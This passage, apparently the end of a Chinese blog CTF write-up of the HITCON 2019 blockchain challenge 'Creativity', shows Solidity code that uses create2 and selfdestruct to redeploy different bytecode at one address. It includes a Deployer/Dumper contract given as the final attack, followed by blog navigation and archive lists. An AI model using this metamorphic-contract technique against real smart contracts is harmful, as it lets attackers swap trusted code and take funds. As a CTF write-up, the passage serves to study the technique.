class="string">&#x27;608060405260043610610045577c0100000000000000000000000000000000000000000000000000000000600035046383197ef0811461004a578063bcdfe0d514610061575b600080fd5b34801561005657600080fd5b5061005f6100eb565b005b34801561006d57600080fd5b506100766100ee565b6040805160208082528351818301528351919283929083019185019080838360005b838110156100b0578181015183820152602001610098565b50505050905090810190601f1680156100dd5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b33ff5b6000805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156101745780601f1061014957610100808354040283529160200191610174565b820191906000526020600020905b81548152906001019060200180831161015757829003601f168201915b50505050508156fea165627a7a72305820f54e3277e157b3ba1564c90516d898a6ac23e90c395e701e5f17b0d93069b8f90029&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// check address 0x7973d5166b9526b9e4e63595293d6b895d2d4fe3 on etherscan </span></span><br><span class="line">    <span class="comment">// also check extcodeHashes on 0x7973d5166b9526b9e4e63595293d6b895d2d4fe3 index 0 and 1 - they are different </span></span><br><span class="line">    <span class="comment">// (and they are not empty account hashes =) )</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> bytes32[]) public extcodeHashes;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deployContract</span>(<span class="params">bytes memory deployThis, bytes32 seed</span>) <span class="title">public</span> <span class="title">payable</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        address ret; </span><br><span class="line">        deployBytecode = deployThis;</span><br><span class="line">        </span><br><span class="line">        bytes memory <span class="title">constructorCode_mem</span> = <span class="title">constructorCode</span>;</span><br><span class="line">        </span><br><span class="line">        assembly &#123;</span><br><span class="line">            ret := create2(callvalue, add(<span class="number">0x20</span>, <span class="title">constructorCode_mem</span>), <span class="title">mload</span>(<span class="params">constructorCode_mem</span>), <span class="title">seed</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title">bytes32</span> <span class="title">hash</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">               hash := extcodehash(ret)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        extcodeHashes[ret].push(hash);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deployTEST1</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">        deployContract(HelloWorld1_bytecode, bytes32(bytes2(<span class="number">0x1337</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deployTEST2</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">        deployContract(HelloWorld2_bytecode, bytes32(bytes2(<span class="number">0x1337</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终攻击的合约</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    bytes public deployBytecode;</span><br><span class="line">    address public deployedAddr;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deploy</span>(<span class="params">bytes memory code</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        deployBytecode = code;</span><br><span class="line">        address a;</span><br><span class="line">        <span class="comment">// Compile Dumper to get this bytecode</span></span><br><span class="line">        bytes memory dumperBytecode = hex<span class="string">&#x27;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&#x27;</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            a := create2(callvalue, add(<span class="number">0x20</span>, dumperBytecode), mload(dumperBytecode), <span class="number">0x9453</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddr = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Dumper &#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">        Deployer dp = Deployer(msg.sender);</span><br><span class="line">        bytes memory bytecode = dp.deployBytecode();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">return</span> (add(bytecode, <span class="number">0x20</span>), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Congrats to @Sissel for being the only person who solved my two challenges during the CTF! I hope all of you enjoy this challenge and Balsn CTF.</p>
+</blockquote>
+<p>我真棒！</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://aisissel.com">Sissel</a>
+            <p>原文链接：<a href="http://aisissel.com/2020/01/20/wp-202001hitcon-Creativity/">http://aisissel.com/2020/01/20/wp-202001hitcon-Creativity/</a>
+            <p>发表日期：<a href="http://aisissel.com/2020/01/20/wp-202001hitcon-Creativity/">January 20th 2020, 11:12:55 am</a>
+            <p>更新日期：<a href="http://aisissel.com/2020/01/20/wp-202001hitcon-Creativity/">November 4th 2020, 10:28:36 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/01/20/wp-202001hitcon-Bank/" title= "【区块链】Hitcon2019-区块链-Bank">
+                    <div class="nextTitle">【区块链】Hitcon2019-区块链-Bank</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/04/22/wp-201905ciscn-DaysBank/" title= "【writeup】DaysBank">
+                    <div class="prevTitle">【writeup】DaysBank</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:boke1208#gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/boke1208" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.weibo.com/1867954903/profile" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://twitter.com/SisselZhao" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/784419" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 14
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2020/03/20/wp-202002zhanyi-OwnerMoney/" >【区块链】赛宁新春战役CTF-区块链-OwnerMoney</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/20</span><a class="archive-post-title" href= "/2020/01/20/wp-202001hitcon-Bank/" >【区块链】Hitcon2019-区块链-Bank</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/20</span><a class="archive-post-title" href= "/2020/01/20/wp-202001hitcon-Creativity/" >【区块链】Hitcon2019-区块链-Creativity</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2019/04/22/wp-201905ciscn-DaysBank/" >【writeup】DaysBank</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2019/04/04/study-hard-mysql-query-4/" >【SQL】四个比较难的SQL语句</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/study-how-to-interview-for-mysql/" >【SQL】SQL语句怎么写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2019/03/26/study-get-startted-with-python/" >python入门的文档总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2019/03/23/wp-201905tctf-quals/" >【writeup】tctf2019-quals</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2019/03/21/dev-mina-0/" >【研发】天天种树小程序 1 起步+调研</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span><a class="archive-post-title" href= "/2019/03/19/paper-merkle-tree-vulnerability/" >【安全研究】区块链公链审计过程中遇到的Merkle Tree底层实现问题 及 CVE-2012-2459分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/2019/03/17/study-create-blog/" >搭blog服务器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/28</span><a class="archive-post-title" href= "/2019/02/28/travel-taiwan-0/" >台湾半岛游-其零</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href= "/2018/11/21/wp-2018hctf/" >【writeup】hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2018/10/15/wp-2018dorahack-blockchain/" >【writeup】DoraHacks 区块链安全Hackathon</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="小程序"><span class="iconfont-archer">&#xe606;</span>小程序</span>
+    
+        <span class="sidebar-tag-name" data-tags="天天种树"><span class="iconfont-archer">&#xe606;</span>天天种树</span>
+    
+        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔试题"><span class="iconfont-archer">&#xe606;</span>笔试题</span>
+    
+        <span class="sidebar-tag-name" data-tags="区块链"><span class="iconfont-archer">&#xe606;</span>区块链</span>
+    
+        <span class="sidebar-tag-name" data-tags="go"><span class="iconfont-archer">&#xe606;</span>go</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="服务器"><span class="iconfont-archer">&#xe606;</span>服务器</span>
+    
+        <span class="sidebar-tag-name" data-tags="nginx"><span class="iconfont-archer">&#xe606;</span>nginx</span>
+    
+        <span class="sidebar-tag-name" data-tags="淘宝店"><span class="iconfont-archer">&#xe606;</span>淘宝店</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="面试"><span class="iconfont-archer">&#xe606;</span>面试</span>
+    
+        <span class="sidebar-tag-name" data-tags="台湾"><span class="iconfont-archer">&#xe606;</span>台湾</span>
+    
+        <span class="sidebar-tag-name" data-tags="游记"><span class="iconfont-archer">&#xe606;</span>游记</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="天枢"><span class="iconfont-archer">&#xe606;</span>天枢</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约"><span class="iconfont-archer">&#xe606;</span>智能合约</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Sissel"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
